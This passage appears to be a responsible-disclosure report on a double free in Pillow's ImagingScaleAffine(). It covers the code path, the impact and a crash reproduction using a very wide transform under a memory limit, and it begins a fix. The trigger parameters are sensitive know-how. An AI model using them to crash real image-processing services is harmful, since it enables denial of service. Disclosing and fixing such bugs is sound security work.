`Resampling.NEAREST` (`Image.py:2936`). In C, `_transform()` passes its *own* image as the destination: ```c /* src/_imaging.c:2153 */ imOut = ImagingTransform( self->image, imagep->image, method, x0, y0, x1, y1, a, filter, fill ); ``` `ImagingTransformAffine()` takes the scaling fast path because the filter is NEAREST and the matrix has no shear: ```c /* src/libImaging/Geometry.c:1035-1043 */ if (filterid || imIn->type == IMAGING_TYPE_I16) { return ImagingGenericTransform(…); } if (a[1] == 0 && a[3] == 0) { /* Scaling */ return ImagingScaleAffine(imOut, imIn, x0, y0, x1, y1, a, fill); } ``` and `ImagingScaleAffine()` allocates a table of `imOut->xsize` ints: ```c /* src/libImaging/Geometry.c:863-868 */ /* malloc check ok, uses calloc for overflow */ xintab = (int *)calloc(imOut->xsize, sizeof(int)); if (!xintab) { ImagingDelete(imOut); /* <-- imOut belongs to the caller */ return (Imaging)ImagingError_MemoryError(); } ``` `ImagingDelete()` (`src/libImaging/Storage.c:250-279`) drops the refcount to 0, returns the pixel blocks to the arena / `free()`s them via `im->destroy`, and `free(im)`. `self->image` in the `ImagingCore` object still points at the freed struct. `_transform()` returns `NULL`, `Image.transform()` propagates `MemoryError`, the half-built output `Image` loses its last reference, and `_dealloc()` (`src/_imaging.c:188`) calls `ImagingDelete(imagep->image)` again: it locks `im->mutex` and decrements `im->refcount` inside freed memory, then walks `im->blocks` (already freed, typically reused by then) and frees every entry a second time. In the observed stock-build runs the freed `blocks` array had been overwritten, so `free()` receives a mangled pointer and the process segfaults; with other heap states it is a plain double free of a 300 MB block. Every other error return in `Geometry.c` (`ImagingError_ModeError`, `ImagingError_Mismatch`, `"bad filter number"`, `"bad transform method"`) leaves `imOut` alone; line 866 is the only one that deletes it. The delete is only correct for the other caller, `_resize()` (`src/_imaging.c:2026-2030`), where `imOut` is a fresh `ImagingNewDirty()` temporary that nothing else references. The delete predates Pillow's git history: it came in with the PIL 1.1.7 import, `9a640e315715` ("Forking PIL", 2010-07-30), so every release since Pillow 1.0 is affected. The output width is what decides whether the path is hit: the output image costs `width × height × pixelsize` bytes, the table an additional `4 × width`. A very wide, 1-row output (300 000 000 × 1 "L": 300 MB image, 1.2 GB table) makes the table the allocation that fails. `ImagingNewPrologueSubtype()` caps `xsize` at `INT_MAX/4 - 1`, so the table is at most ~2 GB. ## Impact Applications that let a user choose the output size of `Image.transform()` — `Transform.EXTENT` (crop-and-scale), `Transform.AFFINE` with a pure scale/translate matrix, or the `ImageTransform.ExtentTransform`/`AffineTransform` helpers, all with the default NEAREST resampling — can have an allocation failure turned into a use-after-free and double free inside the worker process instead of the `MemoryError` the API is meant to raise. `resize()`, `thumbnail()` and `rotate()` do not reach this path; `Image.resize(..., NEAREST, box=...)` goes through `ImagingScaleAffine()` but owns its output, and raises a clean `MemoryError`. The second precondition is that the output image itself allocates but the extra `4 × width` bytes do not; on 64-bit Linux with default overcommit this requires an address-space limit on the process (`ulimit -v`, `uwsgi --limit-as`, `systemd LimitAS=`, an in-app `setrlimit`), which is a common hardening for image workers; 32-bit processes can reach it through ordinary address-space exhaustion. The demonstrated consequence is a crash of the process handling the request after `MemoryError` has already been raised and possibly handled. The second `ImagingDelete()` also writes into the freed 128-byte struct (mutex, refcount) and double-frees an attacker-sized block, which is heap corruption rather than a clean abort, but no control over the written data is shown. ## Reproducing Run `repro` (a self-contained Python script) from any directory. It uses the installed stock build, so nothing is rebuilt, and has no companion files. It runs the demonstration above in a child interpreter (`python3 -c`, taking `WIDTH` as an argument): the child disables core files, sets `RLIMIT_AS` to 1 GB (the kind of limit image workers are commonly given), creates an 8×8 "L" image, calls `src.transform((WIDTH, 1), Image.Transform.EXTENT, (0, 0, 8, 8))` with the default NEAREST resampling, prints `MemoryError caught` if that raises, then runs `gc.collect()` and prints `alive`. EXTENT with NEAREST is a pure scale, so the call goes through `ImagingScaleAffine()`, which callocs a `4 × WIDTH`-byte table in addition to the `WIDTH`-byte output image. The script runs the child twice: - **Control:** width 50 000 000. The 50 MB image and the 200 MB table both fit under the limit, and the transform succeeds, which shows the limit itself is harmless. - **Attack:** width 300 000 000. The 300 MB output image is allocated, but `calloc(300000000, 4)` (1.2 GB) fails. Pillow correctly raises `MemoryError`, and the child catches it. But `ImagingScaleAffine()` has already called `ImagingDelete()` on the output image it does not own. When the output image is released, it is freed again. The child prints `MemoryError caught` and then dies with SIGSEGV instead of printing `alive`. If the attack child was killed by a signal and `gdb` is installed, the script runs the attack again under `gdb` and prints the backtrace. The crash is in `free()` ← `memory_return_block`/`ImagingDestroyArray` (`Storage.c:396,408`) ← `ImagingDelete` (`Storage.c:271`) ← `_dealloc` (`_imaging.c:188`). In other words, the Python object's destructor is deleting the already-freed struct a second time. The verdict does not depend on this step. The last line is `BUG` when the control exits 0 and the attack prints `MemoryError caught` and then dies from a signal without printing `alive`. Otherwise it is `OK`. With the attached patch applied, the attack prints `MemoryError caught`, then `alive`, exits 0, and the script prints `OK`. ## Suggested fix `ImagingScaleAffine()` never owns `imOut`.
